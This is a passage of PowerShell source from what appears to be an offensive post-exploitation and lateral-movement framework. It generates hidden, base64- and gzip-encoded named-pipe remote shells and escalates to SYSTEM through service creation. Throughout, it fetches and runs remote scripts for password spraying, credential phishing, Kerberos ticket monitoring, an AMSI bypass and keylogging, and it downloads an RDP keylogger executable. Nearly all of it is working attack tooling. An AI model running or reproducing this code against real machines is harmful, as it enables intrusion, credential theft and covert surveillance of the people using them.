2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"#END#`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose()"
	
		$RawServerScript="`$sD=New-Object System.IO.Pipes.PipeSecurity;`$sU=New-Object System.Security.Principal.SecurityIdentifier ""$SID"";`$aR=New-Object System.IO.Pipes.PipeAccessRule(`$sU,""FullControl"",""Allow"");`$sD.AddAccessRule(`$aR);`$pS=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sD);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$pS);`$sw=New-Object System.IO.StreamWriter(`$pS);while(`$true){if(-not `$pS.IsConnected){break};`$cmd=`$sr.ReadLine();if(`$cmd-eq""exit""){break}else{try{`$res=iex ""`$cmd 2>&1 | Out-String"";`$res -split ""`u{000A}"" | % {`$sw.WriteLine(`$_.TrimEnd())}}catch{`$err=`$_.Exception.Message;`$err-split""`u{000D}`u{000A}"" | % {`$sw.WriteLine(`$_)}};`$sw.WriteLine(""#END#"");`$sw.Flush()}};`$pS.Disconnect();`$pS.Dispose()"
	}
	
	$PwshRawServerScript = $RawServerScript
	
	$RawServerScript = $RawServerScript.Replace("`"", "`\`"")
	
	$RawServerScript = $RawServerScript.Replace('2>&1 ', '2^^^>^^^&1 ^^^')
	
	$b64ServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScript))
	<#
	$ServerScript = @"
`$securityDescriptor = New-Object System.IO.Pipes.PipeSecurity
`$singleuser = New-Object System.Security.Principal.SecurityIdentifier "$SID"
`$accessRule = New-Object System.IO.Pipes.PipeAccessRule(`$singleuser, "FullControl", "Allow")
`$securityDescriptor.AddAccessRule(`$accessRule)
`$pipeServer = New-Object System.IO.Pipes.NamedPipeServerStream('$PN', 'InOut', 1, 'Byte', 'None', 1028, 1028, `$securityDescriptor)
`$pipeServer.WaitForConnection()
`$sr = New-Object System.IO.StreamReader(`$pipeServer)
`$sw = New-Object System.IO.StreamWriter(`$pipeServer)
while (`$true) {
	if (-not `$pipeServer.IsConnected) {break}
	`$command = `$sr.ReadLine()
	if (`$command -eq "exit") {break} 
	else {
		try{
			`$result = Invoke-Expression "`$command 2>&1 | Out-String"
			`$result -split "`n" | ForEach-Object {`$sw.WriteLine(`$_.TrimEnd())}
		} 
		catch {
			`$errorMessage = `$_.Exception.Message
			`$errorMessage -split "`r?`n" | ForEach-Object {`$sw.WriteLine(`$_)}
		}
		`$sw.WriteLine("#END#")
		`$sw.Flush()
	}
}
`$pipeServer.Disconnect()
`$pipeServer.Dispose()
"@
#>
	Write-Output ""
	Write-Output " [+] Global-Listener PipeName: $global:MultiPipeName"
	Write-Output ""
	if($global:payloadformat -eq 'exe'){
		$exefilelocation = "C:\Users\Public\Documents\Amnesiac\Payloads\$($global:MultiPipeName).exe"
		Write-Output " [+] Payload saved to: $exefilelocation"
		Write-Output ""
	}
	else{
		Write-Output " [+] Payload:"
		Write-Output ""
	}
	if($global:payloadformat -eq 'b64'){
		Write-Output " powershell.exe -NoLogo -NonInteractive -ep bypass -WindowS Hidden -enc $b64ServerScript & exit"
		Write-Output ""
	}
	elseif($global:payloadformat -eq 'raw'){
		Write-Output " cmd /c powershell -windowst hidden `"$RawServerScript`" & exit"
		Write-Output ""
	}
	elseif($global:payloadformat -eq 'pwraw'){
		Write-Output " $PwshRawServerScript"
		Write-Output ""
	}
	elseif($global:payloadformat -eq 'pwsh'){
		$ServerScriptEdit = $ServerScript += ";exit"
		$b64ServerScriptEdit = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScriptEdit))
		Write-Output " Start-Process powershell.exe -WindowS Hidden -ArgumentList `"-NoP`", `"-ep Bypass`", `"-enc $b64ServerScriptEdit`""
		Write-Output ""
	}
 	elseif($global:payloadformat -eq 'gzip'){
		$bytesToCompress = [System.Text.Encoding]::UTF8.GetBytes($PwshRawServerScript)
		$memoryStream = [System.IO.MemoryStream]::new()
		$gzipCompressor = [System.IO.Compression.GzipStream]::new($memoryStream, [System.IO.Compression.CompressionMode]::Compress)
		$gzipCompressor.Write($bytesToCompress, 0, $bytesToCompress.Length)
		$gzipCompressor.Close()
		$gzipcompressedBytes = $memoryStream.ToArray()
		$gzipcompressedBase64 = [Convert]::ToBase64String($gzipcompressedBytes)
		Write-Output " `$gz=`'$gzipcompressedBase64`';`$a=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg(`$gz));`$b=New-Object IO.Compression.GzipStream(`$a,[IO.Compression.CoMPressionMode]::deCOmPreSs);`$c=New-Object System.IO.MemoryStream;`$b.COpYTo(`$c);`$d=[System.Text.Encoding]::UTF8.GETSTrIng(`$c.ToArray());`$b.ClOse();`$a.ClosE();`$c.cLose();`$d|IEX > `$null"
		Write-Output ""
		Write-Output " powershell.exe -ep bypass -Window Hidden -c `"`$gz=`'$gzipcompressedBase64`';`$a=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg(`$gz));`$b=New-Object IO.Compression.GzipStream(`$a,[IO.Compression.CoMPressionMode]::deCOmPreSs);`$c=New-Object System.IO.MemoryStream;`$b.COpYTo(`$c);`$d=[System.Text.Encoding]::UTF8.GETSTrIng(`$c.ToArray());`$b.ClOse();`$a.ClosE();`$c.cLose();`$d|IEX > `$null`""
		Write-Output ""
	}
	elseif($global:payloadformat -eq 'exe'){
		$ServerScriptEdit = $ServerScript += ";exit"
		$b64ServerScriptEdit = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScriptEdit))
		$exescript = "Start-Process powershell.exe -WindowS Hidden -ArgumentList `"-NoP`", `"-ep Bypass`", `"-enc $b64ServerScriptEdit`""
		PS1ToEXE -content $exescript -outputFile $exefilelocation
	}
 	
	if(!$NoWait){Start-Sleep 4}
}

function Scan-WaitingTargets{
	
	param(
		[string]$Domain,
		[string]$DomainController
    )
	
	$PipeName = $global:MultiPipeName
	
	if(!$global:AllUserDefinedTargets){
		if (!$global:AllOurTargets) {
			if($Domain -AND $DomainController){$TempAccessVar = CheckReachableHosts -Domain $Domain -DomainController $DomainController}
			else{$TempAccessVar = CheckReachableHosts}
			
			$TempAccessVar = $TempAccessVar | Where-Object { $_ -ne '' -and $_ -ne $null }
			$global:AllOurTargets = $TempAccessVar
			$FinalTargets = $global:AllOurTargets
		} else {$FinalTargets = $global:AllOurTargets}
	}
	
	else{$FinalTargets = $global:AllUserDefinedTargets}
	
	# Create and open a runspace pool
    $runspacePool = [runspacefactory]::CreateRunspacePool(1, [Environment]::ProcessorCount)
    $runspacePool.Open()

    $runspaces = @()

    foreach ($Computer in $FinalTargets) {
        $psRunspace = [powershell]::Create().AddScript({
            param($Computer, $PipeName)

            $pipeClient = New-Object System.IO.Pipes.NamedPipeClientStream("$Computer", $PipeName, 'InOut')
            $pipeClient.Connect(100)
            
            if (!$pipeClient.IsConnected) { return $null }

            $sr = New-Object System.IO.StreamReader($pipeClient)
            $sw = New-Object System.IO.StreamWriter($pipeClient)
			
			$sw.WriteLine("whoami")
			$sw.Flush()
			
			$whoamiInfo = ""
			
			while ($true) {
				$line = $sr.ReadLine()
				if ($line -eq "#END#") {
					#$whoamiInfo = $whoamiInfo.Trim()
					break
				} elseif ($whoamiInfo -eq "") {
					$whoamiInfo = $line.Trim()
				}
			}

            return [PSCustomObject]@{
                'PipeName'     = $PipeName
                'PipeClient'   = $pipeClient
                'StreamReader' = $sr
                'StreamWriter' = $sw
                'ComputerName' = $Computer
				'UniquePipeID' = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_}) -join ''
				'UserID' = $whoamiInfo
            }
        }).AddArgument($Computer).AddArgument($PipeName)

        $psRunspace.RunspacePool = $runspacePool

        # Store handle and other info for later retrieval
        $runspaces += [PSCustomObject]@{
            Handle    = $psRunspace.BeginInvoke()
            Runspace  = $psRunspace
            Computer  = $Computer
        }
    }

    # Collect results and handle any output or errors
    foreach ($runspace in $runspaces) {
        $result = $runspace.Runspace.EndInvoke($runspace.Handle)
        if ($result) {
            $global:MultipleSessions.Add($result)
            $global:Message += " [+] New session established [$($runspace.Computer)]`n"
        }
        # Dispose of the individual runspace when done
        $runspace.Runspace.Dispose()
    }

    # Cleanup the runspace pool when all tasks are complete
    $runspacePool.Close()
    $runspacePool.Dispose()
}


function InteractWithPipeSession{
	
	param(
        [Parameter(Mandatory = $false)]
        [System.IO.Pipes.NamedPipeServerStream]$PipeServer,
		
		[Parameter(Mandatory = $false)]
        [System.IO.Pipes.NamedPipeClientStream]$PipeClient,
        
        [Parameter(Mandatory = $true)]
        [System.IO.StreamWriter]$StreamWriter,
        
        [Parameter(Mandatory = $true)]
        [System.IO.StreamReader]$StreamReader,

        [Parameter(Mandatory = $true)]
        [string]$computerNameOnly,
		
		[Parameter(Mandatory = $true)]
        [string]$PipeName,
		
		[Parameter(Mandatory = $false)]
        [string]$TargetServer,
		
		[Parameter(Mandatory = $false)]
        [string]$serviceToDelete,
		
		[Parameter(Mandatory = $false)]
		[string]$UniquePipeID,
		
		[Parameter(Mandatory = $false)]
        [switch]$ExecuteExitCommand,
		
		[Parameter(Mandatory = $false)]
        [switch]$Admin
    )
	
	Write-Output ""
	
	$sw = $StreamWriter
	$sr = $StreamReader
	
	# Check if client is still connected. If not, break.
	if ($pipeServer -AND (-not $pipeServer.IsConnected)) {
		return
	}
	
	if ($PipeClient -AND (-not $PipeClient.IsConnected)) {
		return
	}
	
	$ipPattern = '^\d{1,3}(\.\d{1,3}){3}$'
   	if($computerNameOnly -match $ipPattern){$PromptComputerName = $computerNameOnly}
    	else{$PromptComputerName = $computerNameOnly -split '\.' | Select-Object -First 1}

	while ($true) {
		
		$timeoutSeconds = 5

		$runspace = [runspacefactory]::CreateRunspace()
		$runspace.Open()

		$scriptBlock = {
			param ($sr, $sw)
			
			# Write the command to the StreamWriter
			$sw.WriteLine("prompt | Out-String")
			$sw.Flush()
			
			# Read the response from the StreamReader
			$output = ""
			while ($true) {
				$line = $sr.ReadLine()
				if ($line -eq "#END#") {
					return $output
				}
				$output += "$line`n"
			}
		}

		$psCmd = [powershell]::Create().AddScript($scriptBlock).AddArgument($sr).AddArgument($sw)
		$psCmd.Runspace = $runspace
		$handle = $psCmd.BeginInvoke()

		if ($handle.AsyncWaitHandle.WaitOne($timeoutSeconds * 1000)) {
			$output = $psCmd.EndInvoke($handle)
			# Remove the last empty line, if it exists
			$output = $output -replace "`n$", ""

			# Add one empty line at the end
			#$output += "`n"

			$remotePath = $output
			$remotePath = $remotePath.Trim()
		} else {
			$global:Message += " [-] The operation timed out [$computerNameOnly]`n"
			#$runspace.Close()
			break
		}

		$runspace.Close()
		
		if($ExecuteExitCommand){
			$sw.WriteLine("exit")
			$sw.Flush()
			Start-Sleep -Milliseconds 50
			if($PipeServer){
				$pipeServer.Disconnect()
				$pipeServer.Dispose()
				break
			}
			if($PipeClient){
				$pipeClient.Close()
				$pipeClient.Dispose()
				break
			}
		}
		
		# Read the command from the server's console
		$promptString = "[$PromptComputerName]: $remotePath "
		[Console]::Write($promptString)
		$command = Read-Host

  		$command = $command.TrimEnd()
		
		$allowedCommands = @(
			"AV", "Kerb", "Patch", "PatchNet", "PInject", "Services", "ShellGen",
			"HashGrab", "Rubeus", "PowerView", "Hive", "Dpapi",
			"Mimi", "AutoMimi", "ClearLogs", "ClearHistory", "Net", "Sessions", "Software", "CredMan", 
			"Startup", "TLS", "Process"
		)

  		if($command -like "Kerb" -OR $command -like "Invoke-PassSpray*" -OR $command -like "DCSync" -OR $command -like "Access_Check*" -OR $command -like "Find-LocalAdminAccess*" -OR $command -like "Invoke-SessionHunter*" -OR $command -like "AutoMimi*" -OR $command -like "Mimi*"){
			$global:RestoreTimeout = $True
			$timeoutSeconds = 300
		}

		if ($allowedCommands -contains $command) {
			$predefinedCommands = Get-Command -Command $command
			
			# Execute each predefined command
			foreach ($cmd in $predefinedCommands) {
				$sw.WriteLine("$cmd")
				$sw.Flush()
			}
		}
		
		elseif ($command -eq "exit") {
			if($Admin){
				$sw.WriteLine("exit")
				$sw.Flush()
				$stoparguments = "\\$TargetServer delete $serviceToDelete"
				Start-Process sc.exe -ArgumentList $stoparguments -WindowStyle Hidden
				Start-Sleep -Milliseconds 500
				if($PipeServer){
					$pipeServer.Disconnect()
					$pipeServer.Dispose()
				}
				if($PipeClient){
					$pipeClient.Close()
					$pipeClient.Dispose()
				}
			}
			break
		}		
		
		elseif ($command -eq "sync") {
			
			$SyncString = "ababcdcdefefghgh"
			
			$sw.WriteLine("Write-Output $SyncString")
			$sw.Flush()
			
			while($true){
				$line = $sr.ReadLine()
				if ($line -eq "$SyncString") {
					break
				}
			}
			
			while($true){
				$line = $sr.ReadLine()
				if ($line -eq "#END#") {
					Write-Output "[+] Resynchronized with stream."
					Write-Output ""
					break
				}
			}
			continue
		}
		
		elseif ($command -eq "GetSystem") {
			
			$sw.WriteLine('$([System.Net.Dns]::GetHostByName(($env:computerName)).HostName)')
			$sw.Flush()

			$gatherhostname = ""
			while ($true) {
				$line = $sr.ReadLine()

				if ($line -eq "#END#") {
					break
				} else {
					$gatherhostname += "$line`n"
				}
			}

			$gatherhostname = ($gatherhostname | Out-String) -split "`n"
			$gatherhostname = $gatherhostname.Trim()
			$gatherhostname = $gatherhostname | Where-Object { $_ -ne '' -and $_ -ne $null }
			
			$randomvalue = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_})
			$randomvalue = $randomvalue -join ""
			$ServiceName = "Service_" + $randomvalue
			
			$global:OldPipeNameToRestore = $global:MultiPipeName
			$global:MultiPipeName = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_}) -join ''
			
			$PN = $global:MultiPipeName
			
			if($global:Detach){$SID = 'S-1-1-0'}
			else{$SID = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value}
			
			$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"$SID`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"#END#`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"
			
			$b64ServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScript))

			$arguments = "create $ServiceName binpath= `"`"C:\Windows\System32\cmd.exe /c powershell.exe -enc $b64ServerScript`"`""

			$startarguments = "start $ServiceName"
			
			$predefinedCommands = @(
				"Start-Process sc.exe -ArgumentList `"$arguments`" -WindowStyle Hidden",
				"Start-Sleep -Milliseconds 1000",
				"Start-Process sc.exe -ArgumentList `"$startarguments`" -WindowStyle Hidden",
				"Start-Sleep -Milliseconds 2000"
			)
			
			foreach ($cmd in $predefinedCommands) {
				$sw.WriteLine("$cmd")
				$sw.Flush()
			}
			
			$sw.WriteLine("Write-Output $PN")
			$sw.Flush()
			
			while($true){
				$line = $sr.ReadLine()
				if ($line -eq "$PN") {
					break
				}
			}
			
			while($true){
				$line = $sr.ReadLine()
				if ($line -eq "#END#") {
					break
				}
			}
			
			if($Admin){
				$stoparguments = "delete $serviceToDelete"
				$sw.WriteLine("Start-Sleep -Seconds 10;sc.exe delete $serviceToDelete;Stop-Process -Id `$pid -Force")
				$sw.Flush()
			}
			
			$global:ScanModer = $True
			$global:OldTargetsToRestore = $global:AllUserDefinedTargets
			$global:AllUserDefinedTargets = $gatherhostname
			$global:RestoreAllUserDefinedTargets = $True
			$global:RestoreOldMultiPipeName = $True
			
			break
		}
		
		elseif ($command -eq "OneIsNone") {
			
			$sw.WriteLine('$([System.Net.Dns]::GetHostByName(($env:computerName)).HostName)')
			$sw.Flush()

			$gatherhostname = ""
			while ($true) {
				$line = $sr.ReadLine()

				if ($line -eq "#END#") {
					break
				} else {
					$gatherhostname += "$line`n"
				}
			}

			$gatherhostname = ($gatherhostname | Out-String) -split "`n"
			$gatherhostname = $gatherhostname.Trim()
			$gatherhostname = $gatherhostname | Where-Object { $_ -ne '' -and $_ -ne $null }
			
			$global:OldPipeNameToRestore = $global:MultiPipeName
			$global:MultiPipeName = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_}) -join ''
			
			$PN = $global:MultiPipeName
			
			if($global:Detach){$SID = 'S-1-1-0'}
			else{$SID = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value}
			
			$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"$SID`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"#END#`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"
			
			$b64ServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScript))
			
			$finalstring =  "Start-Process powershell.exe -WindowS Hidden -ArgumentList `"-ep Bypass`", `"-enc $b64ServerScript`""
			
			$finalstring = $finalstring -replace '"', "'"
			
			$sw.WriteLine("$finalstring")
			$sw.Flush()
			
			$serverOutput = ""
			while ($true) {
				$line = $sr.ReadLine()

				if ($line -eq "#END#") {
					break
				}
			}
			
			if($Admin){
				$stoparguments = "delete $serviceToDelete"
				$sw.WriteLine("Start-Sleep -Seconds 10;sc.exe delete $serviceToDelete;Stop-Process -Id `$pid -Force")
				$sw.Flush()
			}
			
			$global:ScanModer = $True
			$global:OldTargetsToRestore = $global:AllUserDefinedTargets
			$global:AllUserDefinedTargets = $gatherhostname
			$global:RestoreAllUserDefinedTargets = $True
			$global:RestoreOldMultiPipeName = $True
			
			break
		}
		
		elseif ($command -like "Download *") {
			$remotefileName = $command.Split(' ')[1]
			
			# Read the content of the file in Base64 format
			$sw.WriteLine("[Convert]::ToBase64String([System.IO.File]::ReadAllBytes(`"`$pwd\$remotefileName`"))")
			$sw.Flush()
			
			$fileContentBase64 = ""
			while ($true) {
				$line = $sr.ReadLine()
				if ($line -eq "#END#") {
					break
				}
				$fileContentBase64 += $line
			}
			
			# Convert the Base64 string back to bytes and write to a local file
			$directory = "c:\Users\Public\Documents\Amnesiac\Downloads"
			$baseFileNameWithoutExtension = [System.IO.Path]::GetFileNameWithoutExtension($remotefileName)
			$fileExtension = [System.IO.Path]::GetExtension($remotefileName)
			$fileName = Join-Path -Path $directory -ChildPath $remotefileName
			$counter = 0
			while (Test-Path $fileName) {
				$counter++
				$fileName = Join-Path -Path $directory -ChildPath ("$baseFileNameWithoutExtension($counter)$fileExtension")
			}
			[System.IO.File]::WriteAllBytes($fileName, [Convert]::FromBase64String($fileContentBase64))
			Write-Output "[+] File downloaded to $fileName"
			Write-Output ""
			
			continue
		}
		
		elseif ($command -eq 'GListener') {
			Print-MultiListener -NoWait
			continue
		}
		
		elseif ($command -eq 'CredValidate') {
			
			Write-Output ""
			Write-Output "[+] Validate Domain Credentials | https://github.com/Leo4j/Validate-Credentials"
			Write-Output ""
			Write-Output "[+] Usage:"
   			Write-Output ""
			Write-Output "    Validate-Credentials -UserName Senna -Password FuerteCorre1                         Test Credentials"
			Write-Output ""
			Write-Output "    Validate-Credentials -UserName Senna -Password FuerteCorre1 -Domain ferrari.local   Specify Domain"
			Write-Output ""
			Write-Output "    Validate-Credentials -UserName Senna -Domain ferrari.local                          Test Empty Password"
			
			$sw.WriteLine("iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Validate-Credentials.ps1')")
			$sw.Flush()
		}
		
		elseif ($command -eq 'PassSpray') {
			
			Write-Output ""
			Write-Output "[+] Domain Password Spray | https://github.com/Leo4j/PassSpray"
			Write-Output ""
			Write-Output "[+] Usage:"
			Write-Output ""
			Write-Output "    Invoke-PassSpray                             Spray an empty password across the Domain"
			Write-Output ""
			Write-Output "    Invoke-PassSpray -Password P@ssw0rd!         Spray a password across the Domain"
			Write-Output ""
			Write-Output "    Invoke-PassSpray -Password P@ssw0rd! -Domain ferrari.local -DomainController DC01.ferrari.local"
			
			$sw.WriteLine("iex(new-object net.webclient).downloadstring('$($global:ServerURL)/PassSpray.ps1')")
			$sw.Flush()
		}
		
		elseif ($command -eq 'Impersonation') {
			PrintHelpImpersonation
			$sw.WriteLine("iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Token-Impersonation.ps1');iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Tkn_Access_Check.ps1')")
			$sw.Flush()
		}
		
		elseif ($command -eq 'Ask4Creds') {
			Write-Output ""
			Write-Output "[+] Ask4Creds Loaded | Timeout: 25sec"
			Write-Output ""
			$sw.WriteLine("iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Ask4Creds.ps1')")
			$sw.Flush()
		}
		
		elseif ($command -like 'GLSet *') {
			$commandParts = $command -split '\s+', 2
			$OldGlobalPipeName = $global:MultiPipeName
			$global:MultiPipeName = $commandParts[1]
			Write-Output ""
			Write-Output " [+] New Global-Listener PipeName: $global:MultiPipeName | Revert: [GLSet $OldGlobalPipeName]"
			Print-MultiListener -NoWait
			continue
		}
		
		elseif ($command -eq 'scramble') {
			$OldGlobalPipeName = $global:MultiPipeName
			$global:MultiPipeName = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_}) -join ''
			Write-Output ""
			Write-Output " [+] New Global-Listener PipeName: $global:MultiPipeName | Revert: [GLSet $OldGlobalPipeName]"
			Print-MultiListener -NoWait
			continue
		}
		
		elseif ($command -eq 'toggle') {
			if($global:payloadformat -eq 'b64'){
				$global:payloadformat = 'pwsh'
				Write-Output ""
				Write-Output " [+] Payload format: pwsh"
				Write-Output ""
			}
			elseif($global:payloadformat -eq 'pwsh'){
				$global:payloadformat = 'pwraw'
				Write-Output ""
				Write-Output " [+] Payload format: pwsh(raw)"
				Write-Output ""
			}
			elseif($global:payloadformat -eq 'pwraw'){
				$global:payloadformat = 'raw'
				Write-Output ""
				Write-Output " [+] Payload format: cmd(raw)"
				Write-Output ""
			}
			elseif($global:payloadformat -eq 'raw'){
				$global:payloadformat = 'gzip'
				Write-Output ""
				Write-Output " [+] Payload format: gzip"
				Write-Output ""
			}
   			elseif($global:payloadformat -eq 'gzip'){
				$global:payloadformat = 'exe'
				Write-Output ""
				Write-Output " [+] Payload format: exe"
				Write-Output ""
			}
			elseif($global:payloadformat -eq 'exe'){
				$global:payloadformat = 'b64'
				Write-Output ""
				Write-Output " [+] Payload format: cmd(b64)"
				Write-Output ""
			}
			continue
		}
		
		elseif($Command -eq "Monitor"){
			
			$rawCommand = "iex(new-object net.webclient).downloadstring('$($global:ServerURL)/TGT_Monitor.ps1');TGT_Monitor -Timeout 86400 -EncryptionKey `"#Amn3siacP@ssw0rd!#`""
			
			$encCommand = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($rawCommand))
			
			$FinalCommand = "`$process = Start-Process powershell.exe -WindowStyle Hidden -ArgumentList '-ep Bypass', '-enc $encCommand' -PassThru;`$processId = `$process.Id"
			
			$sw.WriteLine("$FinalCommand")
			$sw.Flush()
			
			while ($true) {
				$line = $sr.ReadLine()
				if ($line -eq "#END#") {
					break
				}
			}
			
			$sw.WriteLine('Write-Output "[+] TGT_Monitor started with PID $($processId.Trim()). To kill it [Stop-Process -Id $($processId.Trim())]"')
			$sw.Flush()
		}
		
		elseif($Command -eq "MonitorRead"){
			
			$rawCommand = "iex(new-object net.webclient).downloadstring('$($global:ServerURL)/TGT_Monitor.ps1');TGT_Monitor -EncryptionKey `"#Amn3siacP@ssw0rd!#`" -Read"
			
			$sw.WriteLine("$rawCommand")
			$sw.Flush()
			
			$serverOutput = ""
			while ($true) {
				$line = $sr.ReadLine()

				if ($line -eq "#END#") {
					break
				} else {
					$serverOutput += "$line`n"
					Write-Output $line
				}
			}
			
			if($serverOutput -like "*Empty Registry*"){}
			else{
				# Save TGTs
				$directory = "c:\Users\Public\Documents\Amnesiac\Monitor_TGTs"
				$baseFileNameWithoutExtension = "TGTDump"
				$fileExtension = ".txt"
				$fileName = Join-Path -Path $directory -ChildPath $baseFileNameWithoutExtension$fileExtension
				$counter = 0
				while (Test-Path $fileName) {
					$counter++
					$fileName = Join-Path -Path $directory -ChildPath ("$baseFileNameWithoutExtension($counter)$fileExtension")
				}
				Out-File -InputObject $serverOutput -FilePath $fileName
				Write-Output "[+] Output saved to $fileName"
				Write-Output ""
			}
			continue
		}
		
		elseif($Command -eq "MonitorClear"){
			
			$rawCommand = "iex(new-object net.webclient).downloadstring('$($global:ServerURL)/TGT_Monitor.ps1');TGT_Monitor -Clear"
			
			$sw.WriteLine("$rawCommand")
			$sw.Flush()
			
		}
		
		elseif($Command -eq "Keylog"){
			
			$rawCommand = "iex(new-object net.webclient).downloadstring('$($global:ServerURL)/SimpleAMSI.ps1');iex(new-object net.webclient).downloadstring('$($global:ServerURL)/klg.ps1');KeyLog -logfile `"c:\Users\Public\Documents\`$(`$env:USERNAME)log.txt`""
			
			$encCommand = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($rawCommand))
			
			$FinalCommand = "`$process = Start-Process powershell.exe -WindowStyle Hidden -ArgumentList '-ep Bypass', '-enc $encCommand' -PassThru;`$processId = `$process.Id"
			
			$sw.WriteLine("$FinalCommand")
			$sw.Flush()
			
			while ($true) {
				$line = $sr.ReadLine()
				if ($line -eq "#END#") {
					break
				}
			}
			
			$sw.WriteLine('Write-Output "[+] Keylogger started with PID $($processId.Trim()). To kill it [Stop-Process -Id $($processId.Trim())]"')
			$sw.Flush()
		}
		
		elseif($command -eq "KeylogRead"){
			
			$sw.WriteLine('$env:username')
			$sw.Flush()

			$TempUsernameGrab = ""
			while ($true) {
				$line = $sr.ReadLine()
				if ($line -eq "#END#") {
					break
				}
				$TempUsernameGrab += $line
			}
			
			$ConstructFileName = $TempUsernameGrab + "log.txt"
			
			$sw.WriteLine("try{type c:\Users\Public\Documents\$ConstructFileName | Out-String -Width 4096}catch{}#")
			$sw.Flush()
			
			$KeylogContent = ""
			while ($true) {
				$line = $sr.ReadLine()
				if ($line -eq "#END#") {
					if($KeylogContent){
						Write-Output $KeylogContent.Trim()
						Write-Output ""
					}
					break
				}
				$KeylogContent += $line
			}
			
			$counter = 0
			$directory = "c:\Users\Public\Documents\Amnesiac\Keylogger"
			$baseFileName = $TempUsernameGrab + "_" + "Keylog"
			$fileExtension = ".txt"
			$fileName = Join-Path -Path $directory -ChildPath ($baseFileName + $fileExtension)

			# If the file exists, keep incrementing the counter and updating the filename
			while (Test-Path $fileName) {
				$counter++
				$fileName = Join-Path -Path $directory -ChildPath ($baseFileName + "($counter)" + $fileExtension)
			}
			
			# Save clipboard to file
			if($KeylogContent){
				[System.IO.File]::WriteAllText($fileName, $KeylogContent)
				Write-Output "[+] Keylog saved to $fileName"
				Write-Output ""
			}
			else {Write-Output "[-] Empty Keylog";Write-Output ""}
			
			continue
			
		}

  		elseif($Command -eq "RDPKeylog"){
			
			$FinalCommand = "Invoke-WebRequest -Uri '$($global:ServerURL)/RDPKeylog.exe' -OutFile 'C:\Users\Public\Documents\RDPLog.exe';`$process = Start-Process -FilePath 'C:\Users\Public\Documents\RDPLog.exe' -PassThru;`$processId = `$process.Id"
			
			$sw.WriteLine("$FinalCommand")
			$sw.Flush()
			
			while ($true) {
				$line = $sr.ReadLine()
				if ($line -eq "#END#") {
					break
				}
			}
			
			$sw.WriteLine('Write-Output "[+] RDP Keylogger Loaded | Saving to c:\Users\Public\Documents | https://github.com/nocerainfosec/TakeMyRDP2.0";Write-Output "";Write-Output "[+] RDP Keylogger started with PID $($processId.Trim()). To kill it [Stop-Process -Id $($processId.Trim())]"')
